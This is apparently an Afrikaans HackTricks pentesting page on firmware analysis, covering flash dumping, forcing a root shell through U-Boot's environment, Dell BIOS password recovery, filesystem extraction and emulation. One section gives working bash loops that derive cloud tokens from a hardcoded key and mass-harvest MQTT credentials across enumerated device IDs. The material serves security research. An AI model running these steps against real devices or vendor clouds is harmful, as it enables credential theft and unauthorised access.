# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante hulpbronne

Vir verkryging deur blootgestelde hardeware-koppelvlakke, sien [Firmware-dumping met behulp van 'n UART-konsole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) en [SPI-flash-dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers werk, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, sodat die toestel toegang tot noodsaaklike instruksies het sodra dit aangeskakel word, wat lei tot die bedryfstelsel se opstart.<sup>[[2]](#references)[[3]](#references)</sup> Die ondersoek en moontlike wysiging van firmware is 'n kritieke stap om sekuriteitskwesbaarhede te identifiseer.

## **Inligting insamel**

**Inligting insamel** is 'n kritieke eerste stap om 'n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en die bedryfstelsel wat daarop loop
- Besonderhede oor die selflaaiprogram
- Hardeware-uitleg en datablaaie
- Kodebasismetrieke en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsmiddels van onskatbare waarde, asook die ontleding van enige beskikbare open-source-sagtewarekomponente deur handmatige en geoutomatiseerde hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om potensiële probleme te vind.

## **Firmware verkry**

Firmware kan op verskeie maniere verkry word, elk met sy eie moeilikheidsgraad:

- **Direk** van die bron (ontwikkelaars, vervaardigers)
- Deur dit volgens verskafte instruksies te **bou**
- Deur dit van amptelike ondersteuningswebwerwe af te **laai**
- Deur **Google dork**-navrae te gebruik om gehoste firmwarelêers te vind
- Deur direk toegang tot **cloud storage** te verkry, met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** via verbindings soos **UART**, **JTAG** of **PICit**
- Deur binne toestelkommunikasie na opdateringsversoeke te **sniff**
- Deur **hardcoded opdaterings-eindpunte** te identifiseer en te gebruik
- Deur dit vanaf die selflaaiprogram of netwerk te **dump**
- Deur die stoorskyfie te **verwyder en uit te lees** wanneer niks anders werk nie, met gepaste hardeware-nutsmiddels

### UART-alleen-logboeke: dwing 'n root shell af via U-Boot-omgewing in flash

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds 'n init shell afdwing deur die **U-Boot-omgewingsblob** vanlyn te **wysig**:<sup>[[6]](#references)</sup>

1. Dump SPI-flash met 'n SOIC-8-knip en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Soek die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot env CRC32 vir die blob opnieuw**.
3. Herflits slegs die env-partisie en herlaai; ’n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die bootloader-shell gedeaktiveer is, maar die env-partisie via eksterne flashtoegang skryfbaar is.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskillende gereedskap wat jy hiervoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsgoed vind nie, kontroleer die **entropie** van die image met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander manier saamgepers).

Jy kan ook hierdie nutsgoed gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of gebruik [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te ondersoek.

### Differensiële flash-analise en herwinbare XOR-geheime stoorplekke

Wanneer ’n firmware-instelling geen gedokumenteerde stoorformaat het nie, neem eers verskeie ooreenstemmende flash-lesings, verander **presies een** instelling, stort die volledige chip weer af en vergelyk die offsets. Deur die eksperiment met beheerde waardes te herhaal, kan jy die instelling van tellers en skryfmetadata onderskei; veranderinge by nuwe offsets eerder as in plek dui op ’n slegs-byvoegende of loggestruktureerde stoorplek. Behou geskrapte/afgemerkte inskrywings, aangesien hul loonvraggrepe dalk steeds herwinbaar is.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nadat jy die streek opgespoor het, onttrek die firmware-modules met nutsmiddels soos `binwalk` en reverse-engineer die writer/validator in Ghidra. Bevestig veldgrense, opvulling, sleutelindeksering en sleutelafleiding in die kode, eerder as om die skema slegs uit patrone in die ciphertext af te lei.<sup>[[12]](#references)</sup>

#### Herwin sleutels uit geënkripteerde nulopvulling

Soos beskryf in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), onthul bekende plaintext die keystream-grepe op dieselfde offsets. ’n Veld met ’n vaste grootte is besonder blootgestel wanneer sy nulopvulling elke indeks van ’n herhalende XOR-sleutel dek: die geënkripteerde opvulling onthul daardie sleutelgrepe direk, omdat `0x00 XOR key_byte = key_byte`. As elke sleutelindeks gedek word, rekonstrueer die sleutel uit die ciphertext-stert en dekripteer die ingevulde grepe.<sup>[[12]](#references)</sup>

Dell se kwesbare DVAR BIOS-wagwoordformaat is ’n konkrete voorbeeld: greep `0` van ’n 32-greep-veld is plaintext, terwyl grepe `1..31` ’n herhalende 20-greep-sleutel gebruik.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Vir ’n wagwoordlengte `L` was posisies `L..31` nul voor XOR. Wanneer `L <= 12`, dek daardie posisies elke sleutelindeks, sodat die volledige sleutel en wagwoord sonder brute force herwin word:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Haal sleutels uit historiese rekords

Moenie elke rekord afsonderlik ontleed nie. Die DVAR-sleutel word ongeveer afgelei as `modified_md5(device_seed || variable_GUID || password[0])`: die device seed en GUID is vas, en die enigste wagwoordafhanklike invoer is die eerste byte in cleartext. Dit lewer hoogstens 256 sleutels per toestel en beteken dat rekords wat met dieselfde byte begin, ’n sleutel deel. Groepeer aktiewe en verwyderde rekords volgens daardie byte; ’n kort historiese rekord kan die volledige sleutel via padding leak, waarmee ’n huidige, langer rekord gedekripteer kan word as die rekord se eie padding onvoldoende is. Wagwoordrotasie kan dus blootstelling verhoog wanneer ou ciphertext as tombstoned gemerk word eerder as uitgevee.<sup>[[12]](#references)</sup>

Die [`dellpwn`](https://github.com/R3n5k1/dellpwn)-tool vind DVAR, valideer kandidaatrekords, herwin wagwoorde en kan rou gestoorde/sleutelbytes vertoon. Bou dit vanuit ’n checkout en skandeer ’n geverifieerde flash-image soos volg:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Vir pasgemaakte parsers, verwerp vals positiewe met behulp van rekordstruktuur, beperkings op drukbare karakters, kontroles vir nulopvulling, sleutel-entropie en konsekwentheid waar die sleutel omvou. As herhaalde dumps yl bitomskakelings per skryfbewerking toon, lys die waargenome maskers en rangskik regstellings volgens hierdie beperkings, maar rapporteer dubbelsinnige karakters eerder as om heuristiese uitvoer as presiese herstel aan te bied.<sup>[[12]](#references)</sup>

Wagwoordverifieerders behoort ’n gesoute, herhaalde eenrigting-hash te stoor eerder as omkeerbare syferteks, en log-gestruktureerde stoorplekke behoort verouderde geheime materiaal veilig te verwyder.<sup>[[12]](#references)</sup>

### Verkryging van die lêerstelsel

Met die vorige geannoteerde nutsmiddels soos `binwalk -ev <bin>` behoort jy **die lêerstelsel te kon onttrek**.\
Binwalk onttrek dit gewoonlik binne ’n **lêergids met die naam van die lêerstelseltipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige onttrekking van die lêerstelsel

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy handtekeninge hê nie**. Gebruik in sulke gevalle binwalk om **die lêerstelsel se offset te vind en die saamgeperste lêerstelsel** uit die binêre lêer te carve, en **onttrek** die lêerstelsel dan **handmatig** volgens die tipe daarvan deur die stappe hieronder te volg.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd-opdrag** uit om die Squashfs-lêerstelsel uit te kerf.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Herbouing van gesplete ingebedde wortellêerstelsels

As ’n rou eMMC/SSD-dump ’n geldige lêerstelselkopskrif bevat, maar die metadata-verskuiwings buite die nominale partisie strek, moet dit nie dadelik as korrup geklassifiseer word nie. Ingebedde selflaaikode kan die werklike worteltoestel uit verskeie fisiese reekse saamstel met Device Mapper, dus lewer die uitkerwing van een GPT-partisie slegs die eerste segment.<sup>[[9]](#references)</sup>

#### Triage van die volledige media-beeld

Verifieer eers dat die verkryging voltooi is, die grootte stabiel is en geen skryfproses die beeld steeds gebruik nie. As die lêernaam ’n begin-/eindadres kodeer, vergelyk daardie reeks met die werklike aantal grepe. Herstel die GPT in leesalleenmodus en koppel slegs die vereiste reeks; moenie `vgchange -ay` teen ’n onbetroubare fisiese volume op die werkstasie uitvoer nie, aangesien volumegroepbotsings en onbedoelde skryfbewerkings moontlik is.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Gebruik verkieslik ’n weggooibare VM wanneer die oorspronklike init-logika of ’n LVM-stapel die hele image moet sien. Historiese selflaailogboeke van ’n standaard selflaaipartisie is besonder nuttig: die selflaailaaier het dalk offsets van eie houers, komponentlengtes, slotkeuse, belyningsreëls en handtekeningverifikasie aangeteken. Gebruik dié waardes om ’n ingebedde opdragreël, kern en initramfs uit te sny, en valideer elke uitvoer onafhanklik met `file`, magiese grepe en `binwalk`; as jy tot aan die einde van die houer lees, kan ’n initrd, ACPI-objek of handtekening per ongeluk by die kern gevoeg word.<sup>[[9]](#references)</sup>

#### Herwin die blokkartering tydens selflaai

Onttrek die kern se initramfs en reverse-engineer sy `/init` plus enige bergingsbiblioteke. Volg in [Omkeernutsgoed en basiese metodes](../../reversing/reversing-tools-basic-methods/) stringverwysings vir `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` en partisiepaaie; spoor dan die kode na wat die aktiewe A/B-slot kies en die tabel opstel. Nuttige beginpunte in radare2 is `r2 -A init`, `afl`, `pdf @ main` en `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Die lineêre teiken karteer opeenvolgende reekse van ’n virtuele toestel na reekse op een of meer agterliggende toestelle. ’n Herwonne tabel met twee segmente het dikwels hierdie vorm (alle posisies en lengtes is 512-grepe-sektore):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduseer die masjienkode-rekenkunde presies, insluitend heelgetalwydte, verskuiwings en eenheidsomskakelings. Die volgende uitdrukking rond byvoorbeeld 'n grootte in grepe af tot 'n 4-KiB-grens en skakel dit eers daarna om na 512-greep-sektore; as jy dit met `p4_bytes // 512` vervang, verskuif die geselekteerde stert met `p4_bytes % 4096` wanneer die partisie nie bladsybelyn is nie.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Herbou ’n plat analisebeeld deur die reekse in tabelvolgorde met begrensde stukke te kopieer, eerder as om die volledige mediastorting in die geheue te laai. Dit voorkom ook dat mapper-toestelle aan die gasheerkant geskep word. Hou die GPT-afgeleide offsets, omgekeerde sektortellings en gevolglike uitvoerlengte as afsonderlike assertions.<sup>[[9]](#references)</sup>

#### Onderskei korrupsie van ’n konstante rekonstruksiefout

Kontroleer vir SquashFS die `hsqs`-magic en dekodeer die little-endian 64-bis `bytes_used`-veld by superblok-offset 40 voordat jy `unsquashfs` uitvoer. As ekstraksie in verskeie onverwante strukture misluk, soek binne ’n breë venster rondom die verwagte posisies en vereis sterk strukturele kandidate: ’n dekomprimeerbare metadata-blok, verskeie opeenvolgende geldige gidsinskrywings, geloofwaardige inode-velde, ’n wortel-inode wat ooreenstem met die inode-telling, of ’n geldige integriteit-metadata-struktuur. Een enkele magic-treffer is nie voldoende nie.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wanneer dieselfde getekende delta onafhanklike strukture geldig maak—byvoorbeeld gidsmetadata en ’n verity-rekord—is die waarskynlike oorsaak ’n sistematiese fout in die segmentbegin, eerder as ontbrekende grepe. Gaan terug na die omgekeerde rekenkunde en soek na weggegooide reste, getekendheid, oorloop of sektor-/bladsyafronding voordat jy probeer om weeslêers te herstel of lêerstelselmetadata te lap.<sup>[[9]](#references)</sup>

Hou laastens die beskermingsgrense apart: TPM-verseëlde LUKS-volumes beskerm datavertroulikheid, terwyl ’n getekende dm-verity-kartering die integriteit van die wortellêerstelsel beskerm. ’n Sagteware-TPM herwin nie ’n sleutel wat aan die oorspronklike fisiese TPM verseël is nie, en die selflaai van ’n gewysigde SquashFS deur ’n navorsingsdoeleindes-enigste init wat verity-verifikasie weglaat, vervals nie die handtekening daarvan of breek dm-verity nie.<sup>[[9]](#references)</sup>

## Ontleding van Firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsmiddels om die firmwarebeeld te ontleed en waardevolle data daaruit te onttrek.

### Aanvanklike ontledingsnutsmiddels

’n Stel opdragte word verskaf vir die aanvanklike inspeksie van die binêre lêer (hierna `<bin>` genoem). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die partisie- en lêerstelselbesonderhede te verstaan:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die image te bepaal, word die **entropy** nagegaan met `binwalk -E <bin>`. Lae entropy dui op ’n gebrek aan enkripsie, terwyl hoë entropy op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word tools en hulpbronne soos die **file-data-carving-recovery-tools**-dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe kan herken nie omdat magic bytes ontbreek, is handmatige onttrekking nodig. Dit behels dat `binwalk` gebruik word om die lêerstelsel se offset op te spoor, gevolg deur die `dd`-opdrag om die lêerstelsel uit te sny:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig te onttrek, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel onttrek is, begin die soektog na sekuriteitsfoute. Daar word aandag gegee aan onveilige netwerkdaemons, hardgekodeerde geloofsbriewe, API-eindpunte, funksionaliteit van opdateringsbedieners, ongekompileerde kode, opstartskripte en gecompileerde binaries vir vanlyn ontleding.

**Belangrike liggings** en **items** om te inspekteer, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en skriplêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binaries

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede in die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op gecompileerde binaries

Beide bronkode en gecompileerde binaries wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Verkryging van cloud-konfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie van ’n cloud-eindpunt af wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy ontdek dat `<token>` plaaslik van die toestel-ID afgelei word deur ’n hardgekodeerde geheim te gebruik, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) en voorgestel as hoofletter-heksadesimaal

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY bekom in staat om die URL te rekonstrueer en die cloud-konfigurasie af te haal, wat dikwels MQTT-geloofsbriewe in gewone teks en topic-voorvoegsels blootlê.

Praktiese werksvloei:

1) Onttrek deviceId uit UART-opstartlogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) en neem logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die URL-patroon vir cloud-konfigurasie en broker-adres druk, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en die tokenalgoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die konfigurasiepad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en skakel die digest na hoofletters om:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Oes cloud-konfigurasie en MQTT-aanmeldbewyse

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime te onttrek:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herwonne aanmeldbewyse om op onderhoudsonderwerpe in te teken en na sensitiewe gebeurtenisse te soek:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Lys voorspelbare toestel-ID's (op skaal, met magtiging)

- Baie ekosisteme sluit verskaffer-OUI-/produk-/tipe-grepe in, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's herhaaldelik toets, tokens aflei en configs programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Verkry altyd uitdruklike toestemming voordat jy mass enumeration probeer.
- Verkies emulering of statiese analise om geheime te herwin sonder om teikenhardeware te verander, waar moontlik.


Die emulering van firmware maak **dinamiese analise** van óf ’n toestel se werking óf ’n individuele program moontlik. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede oplewer, maar die oordrag van die root-lêerstelsel of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en bytevolgorde, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emulering van individuele binaries

Wanneer enkele programme ondersoek word, is dit noodsaaklik om die program se bytevolgorde en SVE-argitektuur te bepaal.

#### Voorbeeld met MIPS-argitektuur

Om ’n binary met MIPS-argitektuur te emuleer, kan jy die volgende opdrag gebruik:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binêre lêers is `qemu-mipsel` die gepaste keuse.

#### ARM-argitektuuremulasie

Vir ARM-binêre lêers is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volstelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander maak volledige firmware-emulasie moontlik, outomatiseer die proses en help met dinamiese ontleding.

### Herbou van gesplete en geverifieerde wortellêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar inode-, gids- of fragmenttabel-offsets onmoontlik lyk, moet jy nie dadelik `unsquashfs` regmaak nie. Reverse-engineer die vroeëselflaaibinêre lêer en herskep die bloktoestelgrafiek wat dit skep: ingebedde stelsels kan ’n nominale wortelpartisie blootstel, maar die werklike lêerstelsel met ’n `dm-linear`-kartering opbou wat sektore byvoeg wat by ’n ander partisie geleen is. Toetse wat slegs die superblok nagaan, kan slaag selfs wanneer elke daaropvolgende metadatablok verskuif is.<sup>[[11]](#references)</sup>

Behou die firmware se rekenkunde presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye aangedui word; reproduseer verskuiwings en afkappings in hul oorspronklike volgorde; en hou rekening met bankafhanklike stertstreke in A/B-uitlegte. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat dan uit as 512-greep-sektore; as jy dit met `partition_bytes // 512` vervang, kan die aangehegte omvang met ’n paar kilogrepe verskuif en alle daaropvolgende SquashFS-tabelle beskadig.<sup>[[11]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[11]](#references)</sup>

1. Bepaal elke `dm-linear`-segment se brontoestel, beginsektor en lengte uit die verifikasie-/init-binêre lêer.
2. Voeg die omvangdele saam of karteer dit sonder om hul belyningssemantiek te verander.
3. As onttrekking steeds misluk, soek slegs in ’n klein venster rondom die voorspelde grens en vereis verskeie opeenvolgende geldige metadatastrukture, eerder as om net ’n geloofwaardige superblok te aanvaar.
4. Voer ’n onveranderde `unsquashfs` op die herskepte beeld uit; suksesvolle deursoeking van alle gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Ontlederbeheerde dm-verity-vervanging

Wanneer die ontleder beheer oor die QEMU-kern, initramfs en virtuele skywe het, kan ’n gewysigde wortel gelaai word deur die vervaardiger se verifikasie-PID 1 met ’n klein staties gelinkte init te vervang. Dit is ’n **lab-selflaaikettingvervanging**, nie ’n verbreking van dm-verity, sy RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[11]](#references)</sup>

Die vervangende init behoort die operasionele dele van die oorspronklike selflaaipad na te boots: monteer `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywers 0–2, monteer `/proc` en `/sys`, wag vir die verskafte bloktoestel, monteer die gewysigde wortel as leesalleen, ontkoppel die pseudo-lêerstelsels van die ou wortel, skuif die nuwe montering na `/`, voer `chroot` uit en roep die firmware se oorspronklike `/sbin/init` met `execve()` aan. Deur `/dev`, `/proc` en `/sys` te ontkoppel **voordat** `MS_MOVE` uitgevoer word, voorkom jy dat monteerpunte wat aan die nuwe wortel behoort, per ongeluk ontkoppel word.<sup>[[11]](#references)</sup>

Hou veranderlike toesteltoestand apart van die gewysigde onveranderlike wortel. ’n qcow2-oorleg kan die oorspronklike skyf se LVM-toestand behou terwyl ’n tweede leesalleen virtio-skyf die gewysigde SquashFS verskaf:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Ontfouting van beeldtoestand vanlyn

Inspekteer aanhoudende toestand buite die guest wanneer stadige selflaaie, vernietigende opstartskripte of onbetroubare konsole-aanmelding die fout verberg. Moet nooit ’n overlay koppel wat deur ’n VM wat loop gebruik word nie; stel dit via `qemu-nbd` bloot, beperk LVM-ontdekking tot die bedoelde NBD-partisie, en deaktiveer die volumegroep voordat jy dit ontkoppel.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolasie, skryf tydstempelmerkerlêers na ’n stabiele skryfbare volume en verifieer hulle vanlyn; `/dev/kmsg`, FIFOs en tydelike konsoles kan vals negatiewe oplewer weens rate limiting of vroeë prosesbeëindiging. Vergelyk ook presiese koppelvlakke oor lae heen voordat jy onverwante kode verander: `uname -r` teenoor `/lib/modules/`, ext4-kenmerke op skyf teenoor die kernel-konfigurasie, en die Mesa `libGL`-generasie teenoor die DRI-driver-ABI en PCI-afgeleide drivername. ’n Komponent kan bestaan en selfs suksesvol met `dlopen()` gelaai word, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[11]](#references)</sup>

## Dinamiese analise in die praktyk

